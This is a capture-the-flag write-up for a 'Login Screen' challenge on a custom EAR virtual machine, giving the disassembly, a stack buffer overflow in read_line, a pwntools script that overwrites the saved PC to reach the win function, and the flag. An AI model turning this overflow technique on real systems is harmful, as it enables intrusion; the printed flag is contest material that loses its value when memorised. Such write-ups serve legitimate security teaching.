# Login Screen

```
After entering the access code, you're now presented with the satellite terminal's login prompt. We don't know the correct login details, can you find a way around it?

    LoginScreen.peg
    runpeg (updated)

Note: There is a new build of runpeg available which now has a --flag-port-file option. Create a dummy flag.txt file and then run it like this:

runpeg LoginScreen.peg --flag-port-file flag.txt

This sets up the file whose contents are read when the EAR code runs the RDB instruction to read from port 0xF ('f' for flag, get it?). The way this works is that each time you execute RDB <reg>, (0xF), the next flag byte is read into <reg>. When there are no more flag bytes left to read, CF will be set.
nc sunshinectf.games 25701 
```

Disassemble in the debugger:

```
@puts:
        0200.0000: MOV     A3, 0x7F
        0204.0000: LDB     A1, [A0]
        0206.0000: INC     A0, 1
        0208.0000: AND     A2, A1, A3
        020B.0000: WRB     (0), A2
        020D.0000: CMP     A1, A2
        020F.0000: BRR.NE  @puts+0x4 //0204.0000
        0212.0000: RET
@read_line:
        0214.0000: MOV     A2, A0
        0216.0000: MOV     A0, ZERO
        0218.0000: BRR     @read_line+0x13 //0227.0000
        021B.0000: INC     A0, 1
        021D.0000: STB     [A2],A3
        021F.0000: INC     A2, 1
        0221.0000: CMP     A3, 0xA
        0225.0000: RET.EQ
        0227.0000: CMP     A0, A1
        0229.0000: RET.GE
        022B.0000: RDB     A3, (0)
        022D.0000: BRR.LT  @read_line+0x7 //021B.0000
        0230.0000: XOR     A0, 0xFFFF
        0234.0000: RET
@win:
        0236.0000: RDB     A0, (15)
        0238.0000: BRR.GE  @win+0xa //0240.0000
        023B.0000: WRB     (0), A0
        023D.0000: BRR     @win
        0240.0000: MOV     A0, ZERO
        0242.0000: FCR     0xFF00
@main:
        0245.0000: PSH     {S0, FP, RA-RD}
        0248.0000: INC     FP, SP, 2
        024B.0000: ADD     A0, PC, 0xB0
        0250.0000: FCR     @puts
        0253.0000: ADD     A0, PC, 0x1BC
        0258.0000: FCR     @puts
        025B.0000: SUB     SP, 0x32
        025F.0000: MOV     A0, SP
        0261.0000: MOV     A1, 0x64
        0265.0000: FCR     @read_line
        0268.0000: MOV     S0, A0
        026A.0000: INC     S0, -1
        026C.0000: ADD     A0, PC, 0x1B3
        0271.0000: FCR     @puts
        0274.0000: MOV     A0, SP
        0276.0000: ADD     A1, A0, S0
        0279.0000: CMP     A0, A1
        027B.0000: BRR.GE  @main+0x42 //0287.0000
        027E.0000: LDB     A2, [A0]
        0280.0000: INC     A0, 1
        0282.0000: WRB     (0), A2
        0284.0000: BRR     @main+0x34 //0279.0000
        0287.0000: WRB     (0), 0x21
        028A.0000: WRB     (0), 0xA
        028D.0000: MOV     A0, ZERO
        028F.0000: INC     SP, FP, -2
        0292.0000: POP     {S0, FP, PC-DPC}
        0295.0000: STW     [FP],FP
        0297.0000: BRR     @main
```

There is a stack overflow problem: stack is used as the buffer for `@read_line`. We can use buffer overflow to change `PC` to point to `@win` function when `0292.0000: POP     {S0, FP, PC-DPC}` is executed:

```python
from pwn import *

# context(log_level = "debug")

p = remote("sunshinectf.games", 25701)
# p = process("./runpeg LoginScreen.peg --flag-port-file flag.txt --debug".split())
# p.sendline(b"b 028d")
# p.sendline(b"c")
p.recvuntil(b"Enter username:")
# S0=0x4141, FP=0x4141, PC=0x0236, DPC=0
p.sendline(b"A" * 0x36 + p16(0x0236) + p16(0x0))
p.interactive()
```

Flag: `sun{th1s_i5_ju57_7h3_t1p_0f_7h3_spEAR}`.